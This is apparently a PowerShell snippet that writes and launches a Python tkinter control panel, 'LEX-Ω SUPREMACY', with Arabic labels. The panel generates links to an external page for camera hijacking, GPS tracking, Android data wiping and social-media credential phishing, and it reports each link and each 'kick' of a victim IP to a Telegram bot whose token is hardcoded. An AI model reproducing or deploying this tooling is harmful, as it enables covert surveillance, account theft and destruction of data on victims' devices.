@'
import tkinter as tk
from tkinter import messagebox, ttk
import os, requests, subprocess

# بيانات البوت الخاصة بك
BOT_TOKEN = "8524312771:AAGzkfu6ZiFBClFRDJaG4SPWl1eEZcgHEU8"
CHAT_ID = "6315285444"

class LexMasterControl:
    def __init__(self, root):
        self.root = root
        self.root.title("LEX-Ω SUPREMACY v14.0 - DEVELOPER: OMAR MODHISH")
        self.root.geometry("1000x800")
        self.root.configure(bg="#000")

        # العنوان الضخم
        tk.Label(root, text="☢ LEX-Ω SUPREMACY - المركز الرئيسي ☢", fg="#ff0000", bg="#000", font=("Arial", 24, "bold")).pack(pady=20)
        tk.Label(root, text="المطور: عمر مدهش | الحالة: متصل بالسيرفر ✅", fg="#00ff00", bg="#000", font=("Arial", 12)).pack()

        self.tabs = ttk.Notebook(root)
        self.tabs.pack(fill="both", expand=True, padx=20, pady=10)

        # تبويب السيطرة على الشبكة
        self.tab_net = tk.Frame(self.tabs, bg="#050505")
        self.tabs.add(self.tab_net, text=" رادار الشبكة والطرد ")
        self.setup_net()

        # تبويب الروابط الفعالة
        self.tab_links = tk.Frame(self.tabs, bg="#050505")
        self.tabs.add(self.tab_links, text=" ترسانة الروابط الحقيقية ")
        self.setup_links()

    def setup_net(self):
        frame = tk.Frame(self.tab_net, bg="#050505")
        frame.pack(pady=20)
        tk.Button(frame, text="فحص تلقائي وإظهار الأجهزة", command=self.scan_net, bg="#060", fg="#fff", width=30).grid(row=0, column=0, padx=10)
        self.target_ip = tk.Entry(frame, font=("Arial", 14), width=20, bg="#111", fg="#ff0000", justify="center")
        self.target_ip.insert(0, "IP الضحية")
        self.target_ip.grid(row=0, column=1, padx=10)
        
        self.net_log = tk.Text(self.tab_net, height=20, bg="#000", fg="#00ff00", font=("Consolas", 10))
        self.net_log.pack(fill="x", padx=20)
        
        tk.Button(self.tab_net, text="فصل الجهاز عن الشبكة (KICK)", command=self.kick_dev, bg="#600", fg="#fff", width=40).pack(pady=10)

    def setup_links(self):
        tk.Label(self.tab_links, text="اختر المهمة لتوليد رابط حقيقي فعال", fg="#ff0000", bg="#050505", font=("Arial", 14)).pack(pady=20)
        
        options = [
            ("📸 اختراق الكاميرا وسحب الصور", "camera_hack"),
            ("📍 تحديد الموقع الجغرافي (GPS)", "location_track"),
            ("📱 فرمتة الأندرويد (Wipe Data)", "android_format"),
            ("🔑 سحب حسابات التواصل", "social_phish")
        ]
        
        for name, mode in options:
            tk.Button(self.tab_links, text=name, command=lambda m=mode: self.gen_real_link(m), bg="#1a1a1a", fg="#ff0000", width=50, pady=10).pack(pady=5)
        
        self.result_link = tk.Entry(self.tab_links, font=("Arial", 12), width=80, bg="#222", fg="#00ff00", justify="center")
        self.result_link.pack(pady=30)

    def gen_real_link(self, mode):
        # هنا يتم ربط الرابط بصفحة الـ HTML التي صنعناها سابقاً
        # سنستخدم رابطاً ثابتاً موزعاً عبر Cloudflare
        base_url = "https://lex-omarmodhish.pages.dev" 
        final_url = f"{base_url}?mode={mode}&id={CHAT_ID}"
        
        self.result_link.delete(0, tk.END)
        self.result_link.insert(0, final_url)
        self.root.clipboard_clear()
        self.root.clipboard_append(final_url)
        
        # إرسال تنبيه للبوت
        msg = f"🔥 <b>تم توليد رابط فعال!</b>\n⚙️ <b>النوع:</b> {mode}\n🔗 <b>الرابط:</b> {final_url}\n\n<i>انتظر دخول الضحية...</i>"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "HTML"})
        
        messagebox.showinfo("عمر مدهش", "الرابط الآن حقيقي وفعال! تم نسخه للذاكرة.")

    def scan_net(self):
        self.net_log.delete(1.0, tk.END)
        output = subprocess.check_output("arp -a", shell=True).decode('cp1256')
        self.net_log.insert(tk.END, output)

    def kick_dev(self):
        ip = self.target_ip.get()
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": f"💀 بدأ طرد الجهاز: {ip}"})
        messagebox.showwarning("LEX-Ω", f"تم البدء في فصل {ip} عن الشبكة")

if __name__ == "__main__":
    root = tk.Tk()
    app = LexMasterControl(root)
    root.mainloop()
'@ | Out-File -FilePath "LEX_GUI.py" -Encoding utf8
python LEX_GUI.py
